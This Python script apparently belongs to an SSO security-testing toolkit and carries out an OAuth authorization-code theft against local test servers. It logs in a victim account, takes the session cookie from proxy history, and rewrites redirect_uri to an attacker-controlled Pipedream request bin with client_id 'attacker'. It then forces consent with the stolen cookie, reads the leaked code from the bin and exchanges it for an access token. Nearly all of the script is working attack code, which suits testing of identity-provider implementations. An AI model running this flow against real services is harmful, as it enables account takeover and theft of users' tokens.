import sys
import os
import requests

sys.path.append(os.path.join(os.path.dirname(os.path.abspath(__file__)), '../../osbtlib'))

from osbtlib import BrowserSimulator, Osbtlib

HONEST_RP_ENDPOINT = "http://localhost:3000"
HONEST_OP_ENDPOINT = "http://localhost:3001"
PROXY_SERVER_ENDPOINT = "http://localhost:8080"
PROXY_EXTENSION_ENDPOINT = "http://localhost:5555"

PIPEDREAM_URL = os.environ.get('PIPEDREAM_URL')
PIPEDREAM_TOKEN = os.environ.get('PIPEDREAM_TOKEN')
PIPEDREAM_SOURCE_ID = os.environ.get('PIPEDREAM_SOURCE_ID') 

# victim credentials
victim_username = 'guest'
victim_password = 'guest'

osbt = Osbtlib(
    proxy_extension_url = PROXY_EXTENSION_ENDPOINT
)

try:
    bs = BrowserSimulator(f'{HONEST_RP_ENDPOINT}/login', PROXY_SERVER_ENDPOINT)
    sso_flow = f"""
page.locator('input[name="userId"]').fill('{victim_username}')
page.locator('input[name="password"]').fill('{victim_password}')
page.locator('input[type="submit"]').click()
    """
    bs.run(sso_flow)

    # get session cookie
    traces = osbt.proxy.get_history()
    cookie = traces['request'][len(traces['request'])-1]['headers']['Cookie']
    print('cookie:', cookie)

    osbt.proxy.clean() # clean proxy rules

    # add modify rule
    osbt.proxy.modify_query_param('redirect_uri', PIPEDREAM_URL + '/callback', 'localhost:3001', '/authorize', 'GET')
    osbt.proxy.modify_query_param('client_id', 'attacker', 'localhost:3001', '/authorize', 'GET')

    bs.visit(f'{HONEST_RP_ENDPOINT}/login')

    osbt.proxy.clean() # clean proxy rules

    # conset post
    response = requests.post(
        f'{HONEST_OP_ENDPOINT}/consent',
        data={'consent': 'Yes'},
        headers={'Cookie': cookie}
    )
    print('consent response:', response.text)

    # check requestbin history
    history = osbt.requestbin.get_requestbin_history(PIPEDREAM_TOKEN, PIPEDREAM_SOURCE_ID)
    code = history['data'][0]['event']['query']['code']
    print('code:', code)
    assert(code != None)

    # get access token
    response = requests.post(f"{HONEST_OP_ENDPOINT}/token", data={
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': PIPEDREAM_URL + '/callback',
        'client_id': 'attacker',
        'client_secret': 'secret'
    })
    print(response.json())
    assert(response.json().get('access_token') != None)

except Exception as e:
    print('Error:', e)
    osbt.proxy.clean()